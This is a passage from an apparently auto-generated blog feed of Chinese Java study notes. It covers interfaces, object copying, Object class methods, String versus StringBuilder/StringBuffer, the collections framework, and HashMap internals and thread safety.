class="string">&quot;WoWo&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-4-2-接口">2.4.2 接口</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>接口的方法可以是抽象的，也可以默认实现</p>
</li>
<li class="lvl-2">
<p>java接口的修饰符：<strong>abstract</strong>（默认不写。interface本身就是抽象的，加不加abstract都一样）</p>
</li>
<li class="lvl-2">
<p>接口中字段的修饰符：<strong>public static final</strong>（默认不写）</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">MyInterface</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">default</span> <span class="keyword">void</span> <span class="title function_">method2</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(getClass().getSimpleName() + <span class="string">&quot;: 接口方法method2()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 实现类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MyClass</span> <span class="keyword">implements</span> <span class="title class_">MyInterface</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 实现方法</span></span><br><span class="line">        System.out.println(getClass().getSimpleName() + <span class="string">&quot;: 实现类方法method1()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">MyClass</span> <span class="variable">myClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyClass</span>();</span><br><span class="line">    myClass.method1();</span><br><span class="line">    myClass.method2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/sanpangouba/article/details/87349241">java接口、接口方法、接口属性 的修饰符详解_java接口的修饰符-CSDN博客</a><a href="https://blog.csdn.net/Doreamonx/article/details/125673494">抽象类和接口的区别（通俗易理解）-CSDN博客</a></p>
<h2 id="2-5-深拷贝和浅拷贝">2.5 深拷贝和浅拷贝</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>浅拷贝</strong>：浅拷贝会在堆上创建一个新的对象（区别于引用拷贝的一点），不过，如果原对象内部的属性是引用类型的话，浅拷贝会直接复制内部对象的引用地址，也就是说拷贝对象和原对象<mark>共用同一个内部对象</mark>。</p>
</li>
<li class="lvl-2">
<p><strong>深拷贝</strong>：深拷贝会完全复制整个对象，包括这个对象所包含的内部对象。</p>
</li>
<li class="lvl-2">
<p>引用拷贝：两个不同的引用指向同一个对象。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202312122359896.png" alt="image.png"></p>
</li>
</ul>
<h2 id="2-6-Object类">2.6 Object类</h2>
<p>==和equals</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>对于基本数据类型来说，<code>==</code> 比较的是值。</p>
</li>
<li class="lvl-2">
<p>对于引用数据类型来说，<code>==</code> 比较的是对象的内存地址。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native 方法，用于返回当前运行时对象的 Class 对象，使用了 final 关键字修饰，故不允许子类重写。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> Class&lt;?&gt; getClass()</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native 方法，用于返回对象的哈希码，主要使用在哈希表中，比如 JDK 中的HashMap。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">native</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用于比较 2 个对象的内存地址是否相等，String 类对该方法进行了重写以用于比较字符串的值是否相等。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native 方法，用于创建并返回当前对象的一份拷贝。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">native</span> Object <span class="title function_">clone</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportedException</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回类的名字实例的哈希码的 16 进制的字符串。建议 Object 所有的子类都重写这个方法。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native 方法，并且不能重写。唤醒一个在此对象监视器上等待的线程(监视器相当于就是锁的概念)。如果有多个线程在等待只会任意唤醒一个。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">notify</span><span class="params">()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native 方法，并且不能重写。跟 notify 一样，唯一的区别就是会唤醒在此对象监视器上等待的所有线程，而不是一个线程。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">notifyAll</span><span class="params">()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * native方法，并且不能重写。暂停线程的执行。注意：sleep 方法没有释放锁，而 wait 方法释放了锁 ，timeout 是等待时间。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">(<span class="type">long</span> timeout)</span> <span class="keyword">throws</span> InterruptedException</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 多了 nanos 参数，这个参数表示额外时间（以纳秒为单位，范围是 0-999999）。 所以超时的时间还需要加上 nanos 纳秒。。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">(<span class="type">long</span> timeout, <span class="type">int</span> nanos)</span> <span class="keyword">throws</span> InterruptedException</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 跟之前的2个wait方法一样，只不过该方法一直等待，没有超时时间这个概念</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">wait</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 实例被垃圾回收器回收的时候触发的操作</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">finalize</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="2-7-String">2.7 String</h2>
<h3 id="2-7-1-String、StringBuffer-线程完全-、StringBuilder-非线程安全">2.7.1 String、StringBuffer(线程完全)、StringBuilder(非线程安全)</h3>
<blockquote>
<p>源码阅读</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractStringBuilder</span> <span class="keyword">implements</span> <span class="title class_">Appendable</span>, CharSequence &#123;</span><br><span class="line">    <span class="type">char</span>[] value;</span><br><span class="line">    <span class="keyword">public</span> AbstractStringBuilder <span class="title function_">append</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> appendNull();</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> str.length();</span><br><span class="line">        ensureCapacityInternal(count + len);</span><br><span class="line">        str.getChars(<span class="number">0</span>, len, value, count);</span><br><span class="line">        count += len;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  	<span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>可变性</strong><br>
<code>String</code>是不可变的，<code>StringBuilder</code> 与 <code>StringBuffer</code> 都继承自 <code>AbstractStringBuilder</code> 类，在 <code>AbstractStringBuilder</code> 中也是使用字符数组保存字符串，不过没有使用 <code>final</code> 和 <code>private</code> 关键字修饰，最关键的是这个 <code>AbstractStringBuilder</code> 类还提供了很多修改字符串的方法比如 <code>append</code> 方法。</p>
<p><strong>线程安全性</strong><br>
<code>String</code> 中的对象是不可变的，也就可以理解为常量，线程安全。<code>AbstractStringBuilder</code> 是 <code>StringBuilder</code> 与 <code>StringBuffer</code> 的公共父类，定义了一些字符串的基本操作。<code>StringBuffer</code> 对方法加了同步锁或者对调用的方法加了同步锁，所以是<strong>线程安全</strong>的。<code>StringBuilder</code> 并没有对方法进行加同步锁，所以是<strong>非线程安全</strong>的。</p>
<p><strong>性能</strong><br>
每次对 <code>String</code> 类型进行改变的时候，都会生成一个新的 <code>String</code> 对象，然后将指针指向新的 <code>String</code> 对象。<code>StringBuffer</code> 每次都会对 <code>StringBuffer</code> 对象本身进行操作，而不是生成新的对象并改变对象引用。相同情况下使用 <code>StringBuilder</code> 相比使用 <code>StringBuffer</code> 仅能获得 10%~15% 左右的性能提升，但却要冒多线程不安全的风险。</p>
<p><strong>对于三者使用的总结：</strong></p>
<ol>
<li class="lvl-3">
<p>操作少量的数据: 适用 <code>String</code></p>
</li>
<li class="lvl-3">
<p>单线程操作字符串缓冲区下操作大量数据: 适用 <code>StringBuilder</code></p>
</li>
<li class="lvl-3">
<p>多线程操作字符串缓冲区下操作大量数据: 适用 <code>StringBuffer</code>（线程安全）</p>
</li>
</ol>
<h3 id="2-7-2-String不可改变">2.7.2 String不可改变</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">String</span> <span class="keyword">implements</span> <span class="title class_">java</span>.io.Serializable,Comparable&lt;String&gt;, CharSequence &#123;</span><br><span class="line">    <span class="comment">// @Stable 注解表示变量最多被修改一次，称为“稳定的”。</span></span><br><span class="line">    <span class="meta">@Stable</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">byte</span>[] value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">AbstractStringBuilder</span> <span class="keyword">implements</span> <span class="title class_">Appendable</span>, CharSequence &#123;</span><br><span class="line">    <span class="type">byte</span>[] value;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<blockquote>
<ol>
<li class="lvl-4">
<p>保存字符串的数组被 <code>final</code> 修饰且为私有的，并且<code>String</code> 类没有提供/暴露修改这个字符串的方法</p>
</li>
<li class="lvl-3">
<p><code>String</code> 类被 <code>final</code> 修饰导致其不能被继承，进而避免了子类破坏 <code>String</code> 不可变。</p>
</li>
</ol>
</blockquote>
<h3 id="2-7-3-字符串拼接-StringBuilder">2.7.3 字符串拼接(+ StringBuilder)</h3>
<p><a href="https://juejin.cn/post/7182872058743750715">还在无脑用 StringBuilder？来重温一下字符串拼接吧 - 掘金 (juejin.cn)</a></p>
<h3 id="2-7-4-字符串常量池">2.7.4 字符串常量池</h3>
<p><strong>字符串常量池</strong> 是 JVM 为了提升性能和减少内存消耗针对字符串（String 类）专门开辟的一块区域，主要目的是为了避免字符串的重复创建。</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/2024/03/04/Java/Java(3)%EF%BC%9A%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<p>ArrayList： 动态数组，实现了List接口，支持动态增长。<br>
LinkedList： 双向链表，也实现了List接口，支持快速的插入和删除操作。<br>
HashMap： 基于哈希表的Map实现，存储键值对，通过键快速查找值。<br>
HashSet： 基于HashMap实现的Set集合，用于存储唯一元素。<br>
TreeMap： 基于红黑树实现的有序Map集合，可以按照键的顺序进行排序。<br>
LinkedHashMap： 基于哈希表和双向链表实现的Map集合，保持插入顺序或访问顺序。<br>
PriorityQueue： 优先队列，可以按照比较器或元素的自然顺序进行排序。</p>
<p>Java 集合，也叫作容器，主要是由两大接口派生而来：一个是 <code>Collection</code>接口，主要用于存放单一元素；另一个是 <code>Map</code> 接口，主要用于存放键值对。对于<code>Collection</code> 接口，下面又有三个主要的子接口：<code>List</code>、<code>Set</code> 、 <code>Queue</code>。<br>
<img src="https://cdn.jsdelivr.net/gh/destiny0118/picgo/pic2023/202405281131352.png" alt="image.png"></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>List</code>(对付顺序的好帮手): 存储的元素是有序的、可重复的。</p>
</li>
<li class="lvl-2">
<p><code>Set</code>(注重独一无二的性质): 存储的元素不可重复的。</p>
</li>
<li class="lvl-2">
<p><code>Queue</code>(实现排队功能的叫号机): 按特定的排队规则来确定先后顺序，存储的元素是有序的、可重复的。</p>
</li>
<li class="lvl-2">
<p><code>Map</code>(用 key 来搜索的专家): 使用键值对（key-value）存储，类似于数学上的函数 y=f(x)，“x” 代表 key，“y” 代表 value，key 是无序的、不可重复的，value 是无序的、可重复的，每个键最多映射到一个值。</p>
</li>
</ul>
<table>
<thead>
<tr>
<th>集合</th>
<th>实现</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td>List</td>
<td>ArrayList</td>
<td></td>
</tr>
<tr>
<td></td>
<td>vector</td>
<td><mark>线程安全</mark></td>
</tr>
<tr>
<td></td>
<td>LinkedList</td>
<td></td>
</tr>
<tr>
<td>Set</td>
<td>HashSet</td>
<td></td>
</tr>
<tr>
<td></td>
<td>LinkedHashSet</td>
<td></td>
</tr>
<tr>
<td></td>
<td>TreeSet</td>
<td></td>
</tr>
<tr>
<td>Map</td>
<td>HashMap</td>
<td>线程不安全，key、value都可为null</td>
</tr>
<tr>
<td></td>
<td>LinkedHashMap</td>
<td></td>
</tr>
<tr>
<td></td>
<td>HashTable</td>
<td><mark>线程安全</mark>，数组+链表组成的，数组是 HashTable 的主体，链表则是主要为了解决哈希冲突而存在的。HashTable 的加锁方法是给每个方法加上synchronized 关键字，不支持null键和值</td>
</tr>
<tr>
<td></td>
<td>TreeMap</td>
<td>红黑树</td>
</tr>
<tr>
<td></td>
<td>ConcurrentHashMap</td>
<td>Node数组+链表+红黑树实现，线程安全的（jdk1.8以前Segment锁，1.8以后volatile + CAS 或者 synchronized）</td>
</tr>
</tbody>
</table>
<p>Queue</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>PriorityQueue</p>
</li>
<li class="lvl-2">
<p>DelayQueue</p>
</li>
<li class="lvl-2">
<p>ArrayDeque</p>
</li>
</ul>
<p><code>HashSet</code>，<code>TreeSet</code>，<code>ArrayList</code>,<code>LinkedList</code>,<code>HashMap</code>,<code>TreeMap</code> 都是线程不安全的。</p>
<h1>1 List</h1>
<h2 id="1-1-ArrayList和LinkedList区别">1.1 ArrayList和LinkedList区别</h2>
<ol>
<li class="lvl-3">
<p><strong>底层数据结构：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>ArrayList</code>使用<em>动态数组</em>实现。它的内部是一个数组，当数组容量不足时，会自动进行扩容。</li>
<li class="lvl-6"><code>LinkedList</code>使用<em>双向链表</em>实现。每个元素都包含一个指向前一个元素和一个指向后一个元素的引用。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>随机访问性能：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>ArrayList</code>支持快速的随机访问，因为它是基于数组的，可以通过索引直接访问元素。</li>
<li class="lvl-6"><code>LinkedList</code>在随机访问时性能较差，因为必须从链表的头部或尾部开始遍历，直到找到目标元素。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>插入和删除操作性能：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>ArrayList</code>在中间插入或删除元素时性能较差，因为需要移动数组中的元素。</li>
<li class="lvl-6"><code>LinkedList</code>在插入和删除元素时性能较好，因为只需要改变相邻元素的引用。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>空间复杂度：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>ArrayList</code>相对较省空间，因为它只需要存储元素值和数组容量。</li>
<li class="lvl-6"><code>LinkedList</code>相对较耗费空间，因为每个元素都需要额外的两个引用字段。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>迭代器性能：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>ArrayList</code>上的迭代器性能较好，因为它可以通过索引直接访问元素。</li>
<li class="lvl-6"><code>LinkedList</code>上的迭代器性能较差，因为必须沿着链表一个一个地移动。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>适用场景：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">如果需要频繁进行随机访问，使用<code>ArrayList</code>更为合适。</li>
<li class="lvl-6">如果需要频繁进行插入和删除操作，特别是在集合的中间位置，使用<code>LinkedList</code>更为合适。</li>
</ul>
</li>
</ol>
<h1>2 Set</h1>
<h2 id="2-1-Comparable和Comparator">2.1 Comparable和Comparator</h2>
<p><code>Comparable</code> 接口和 <code>Comparator</code> 接口都是 Java 中用于排序的接口，它们在实现类对象之间比较大小、排序等方面发挥了重要作用：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Comparable</code> 接口实际上是出自<code>java.lang</code>包 它有一个 <code>compareTo(Object obj)</code>方法用来排序</p>
</li>
<li class="lvl-2">
<p><code>Comparator</code>接口实际上是出自 <code>java.util</code> 包它有一个<code>compare(Object obj1, Object obj2)</code>方法用来排序</p>
</li>
</ul>
<h2 id="2-2-Hashset、LinkedHashSet、TreeSet">2.2 Hashset、LinkedHashSet、TreeSet</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>HashSet</code>、<code>LinkedHashSet</code> 和 <code>TreeSet</code> 的主要区别在于底层数据结构不同。<code>HashSet</code> 的底层数据结构是哈希表（基于 <code>HashMap</code> 实现）。<code>LinkedHashSet</code> 的底层数据结构是链表和哈希表，元素的插入和取出顺序满足 FIFO。<code>TreeSet</code> 底层数据结构是红黑树，元素是有序的，排序的方式有自然排序和定制排序。</p>
</li>
<li class="lvl-2">
<p>底层数据结构不同又导致这三者的应用场景不同。<code>HashSet</code> 用于不需要保证元素插入和取出顺序的场景，<code>LinkedHashSet</code> 用于保证元素的插入和取出顺序满足 FIFO 的场景，<code>TreeSet</code> 用于支持对元素自定义排序规则的场景。</p>
</li>
</ul>
<h1>3 Map</h1>
<h2 id="3-1-HashMap和TreeMap">3.1 HashMap和TreeMap</h2>
<p><strong>相比于<code>HashMap</code>来说， <code>TreeMap</code> 主要多了对集合中的元素根据键排序的能力以及对集合内元素的搜索的能力。</strong></p>
<h2 id="3-2-HashMap">3.2 HashMap</h2>
<blockquote>
<p>[!note]<br>
JDK1.8 之前 HashMap 由数组+链表组成的，数组是 HashMap 的主体，链表则是主要为了解决哈希冲突而存在的（“拉链法”解决冲突），JDK1.8 以后在解决哈希冲突时有了较大的变化，当链表长度大于阈值（默认为 8）时，将链表转化为红黑树，以减少搜索时间</p>
</blockquote>
<p>在 JDK 1.7 版本之前， HashMap 数据结构是数组和链表，HashMap通过哈希算法将元素的键（Key）映射到数组中的槽位（Bucket）。如果多个键映射到同一个槽位，它们会以链表的形式存储在同一个槽位上，因为链表的查询时间是O(n)，所以冲突很严重，一个索引上的链表非常长，效率就很低了。</p>
<h3 id="3-2-1-哈希冲突解决方式">3.2.1 哈希冲突解决方式</h3>
<ul class="lvl-0">
<li class="lvl-2">
<p>链接法：使用链表或其他数据结构来存储冲突的键值对，将它们链接在同一个哈希桶中。</p>
</li>
<li class="lvl-2">
<p>开放寻址法：在哈希表中找到另一个可用的位置来存储冲突的键值对，而不是存储在链表中。常见的开放寻址方法包括线性探测、二次探测和双重散列。</p>
</li>
<li class="lvl-2">
<p>再哈希法（Rehashing）：当发生冲突时，使用另一个哈希函数再次计算键的哈希值，直到找到一个空槽来存储键值对。</p>
</li>
<li class="lvl-2">
<p>哈希桶扩容：当哈希冲突过多时，可以动态地扩大哈希桶的数量，重新分配键值对，以减少冲突的概率。</p>
</li>
</ul>
<h3 id="3-2-2-hashcode和equals">3.2.2 hashcode和equals</h3>
<p>equals相等的两个对象，hashCode一定相等。hashCode相等的两个对象，equals不一定相等</p>
<h3 id="3-2-3-扩容机制">3.2.3 扩容机制</h3>
<ol>
<li class="lvl-3">
<p><strong>初始容量和负载因子：</strong></p>
<ul class="lvl-2">
<li class="lvl-6"><code>HashMap</code> 有一个初始容量和一个负载因子。初始容量是哈希表在创建时的容量，默认为 16。负载因子是一个在哈希表大小超过其容量乘以负载因子时，哈希表将进行扩容的阈值，默认为 0.75。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>扩容操作：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">当哈希表的元素个数达到了负载因子所定义的阈值，<code>HashMap</code> 将进行扩容操作。</li>
<li class="lvl-6">扩容操作包括创建一个新的哈希表，其容量为原容量的两倍，然后将所有元素重新分配到新的哈希表中。<br>
<a href="https://zhuanlan.zhihu.com/p/114363420">HashMap的扩容机制 - 知乎 (zhihu.com)</a><br>
<a href="https://blog.csdn.net/qq_49217297/article/details/126304736">HashMap实现原理， 扩容机制，面试题和总结_hashmap扩容机制面试-CSDN博客</a></li>
</ul>
</li>
</ol>
<h3 id="3-2-4-HashMap多线程导致死循环">3.2.4 HashMap多线程导致死循环</h3>
<p>当一个桶位中有多个元素需要进行扩容时，多个线程同时对链表进行操作，<code>头插法</code>可能会导致链表中的节点指向错误的位置，从而形成一个环形链表，进而使得查询元素的操作陷入死循环无法结束。为了解决这个问题，JDK1.8 版本的 HashMap 采用了尾插法而不是头插法来避免链表倒置，使得插入的节点永远都是放在链表的末尾，避免了链表中的环形结构。</p>
<p><a href="https://coolshell.cn/articles/9606.html">疫苗：Java HashMap的死循环 | 酷 壳 - CoolShell</a></p>
<h3 id="3-2-5-HashMap为什么线程不安全">3.2.5 HashMap为什么线程不安全</h3>
<p>多线程环境下，<code>HashMap</code> 扩容时会造成<code>死循环</code> 和<code>数据丢失</code>的问题。在 <code>HashMap</code> 中，多个键值对可能会被分配到同一个桶（bucket），并以链表或红黑树的形式存储。多个线程对<code>HashMap</code>的put操作会导致线程不安全，可能产生数据覆盖.<br>
数据不一致</p>
<h4 id="3-2-3-1-同时检测到桶位置为空，插入元素">3.2.3.1 同时检测到桶位置为空，插入元素</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>两个线程同时进行put操作，并且存在哈希冲突</p>
</li>
<li class="lvl-2">
<p>由于线程首先都执行完了hash碰撞的判断，桶为空</p>
</li>
<li class="lvl-2">
<p>每个线程再向空桶中插入元素</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 判断是否出现 hash 碰撞</span></span><br><span class="line">    <span class="comment">// (n - 1) &amp; hash 确定元素存放在哪个桶中，桶为空，新生成结点放入桶中(此时，这个结点是放在数组中)</span></span><br><span class="line">    <span class="keyword">if</span> ((p = tab[i = (n - <span class="number">1</span>) &amp; hash]) == <span class="literal">null</span>)</span><br><span class="line">        tab[i] = newNode(hash, key, value, <span class="literal">null</span>);</span><br><span class="line">    <span class="comment">// 桶中已经存在元素（处理hash冲突）</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="3-2-3-2-多个线程同时put操作导致size不正确">3.2.3.2 多个线程同时put操作导致size不正确</h4>
<ul class="lvl-0">
<li class="lvl-2">
<p>两个线程都先获取size，在++size</p>
</li>
<li class="lvl-2">
<p>添加两次元素，而size只增加1</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> V <span class="title function_">putVal</span><span class="params">(<span class="type">int</span> hash, K key, V value, <span class="type">boolean</span> onlyIfAbsent,</span></span><br><span class="line"><span class="params">                   <span class="type">boolean</span> evict)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 实际大小大于阈值则扩容</span></span><br><span class="line">    <span class="keyword">if</span> (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    <span class="comment">// 插入后回调</span></span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://zhuanlan.zhihu.com/p/484653028">基于JDK8的HashMap实现(万字详解) - 知乎 (zhihu.com)</a></p>
<h3 id="3-2-6-底层实现">3.2.6 底层实现</h3>
<p>JDK1.8 之前 <code>HashMap</code> 底层是 <strong>数组和链表</strong> 结合在一起使用也就是 <strong>链表散列</strong>。HashMap 通过 key 的 <code>hashcode</code> 经过扰动函数处理过后得到 hash 值，然后通过 <code>(n - 1) &amp; hash</code> 判断当前元素存放的位置（这里的 n 指的是数组的长度），如果当前位置存在元素的话，就判断该元素与要存入的元素的 hash 值以及 key 是否相同，如果相同的话，直接覆盖，不相同就通过拉链法解决冲突。</p>
<p>所谓扰动函数指的就是 HashMap 的 <code>hash</code> 方法。使用 <code>hash</code> 方法也就是扰动函数是为了防止一些实现比较差的 <code>hashCode()</code> 方法 换句话说使用扰动函数之后可以减少碰撞。</p>
<p>相比于之前的版本， JDK1.8 之后在解决哈希冲突时有了较大的变化，当<mark>链表长度大于阈值（默认为 8）</mark>（将链表转换成红黑树前会判断，如果当前数组的长度小于 64，那么会选择先进行数组扩容，而不是转换为红黑树）时，将链表转化为红黑树，以减少搜索时间。</p>
<h3 id="3-2-7-put添加元素过程">3.2.7 put添加元素过程</h3>
<ol>
<li class="lvl-3">
<p><strong>计算哈希码（Hash Code）：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">当你向 <code>HashSet</code> 中添加一个元素时，首先会调用该元素的 <code>hashCode()</code> 方法，得到元素的哈希码。</li>
<li class="lvl-6">如果元素为 <code>null</code>，则它的哈希码为 0。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>映射到桶位置（Bucket Position）：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">哈希码经过一系列的变换和运算，被映射到哈希表中的一个桶位置（bucket position）。</li>
<li class="lvl-6">桶位置是一个数组索引，表示存储元素的位置。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>处理哈希冲突：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">哈希表可能存在冲突，即不同元素映射到相同的桶位置。为了解决冲突，<code>HashSet</code> 使用链表或红黑树（在JDK 8之后）来存储相同桶位置上的元素。</li>
<li class="lvl-6">如果桶位置上已经有一个元素，新元素会被添加到链表或红黑树的末尾。</li>
</ul>
</li>
<li class="lvl-3">
<p><strong>检查元素唯一性：</strong></p>
<ul class="lvl-2">
<li class="lvl-6">在添加元素的过程中，<code>HashSet</code> 会通过调用元素的 <code>equals()</code> 方法来检查元素的唯一性。</li>
<li class="lvl-6">如果已经存在相同的元素（根据 <code>equals()</code> 判断），新元素不会被加入。</li>
</ul>
</li>
</ol>
<h3 id="3-2-8-如何做到让HashMap线程安全">3.2.8 如何做到让HashMap线程安全</h3>
<ol>
<li class="lvl-3">
<p><strong>使用<code>Collections.synchronizedMap</code>方法：</strong><br>
Map&lt;K, V&gt; synchronizedMap = Collections.synchronizedMap(new HashMap&lt;K, V&gt;());</p>
<p>这将返回一个线程安全的<code>Map</code>，它在每个方法上都使用同步机制来确保线程安全。但请注意，虽然这确保了每个方法的原子性，但在多个操作之间，仍然可能需要额外的同步。</p>
</li>
<li class="lvl-3">
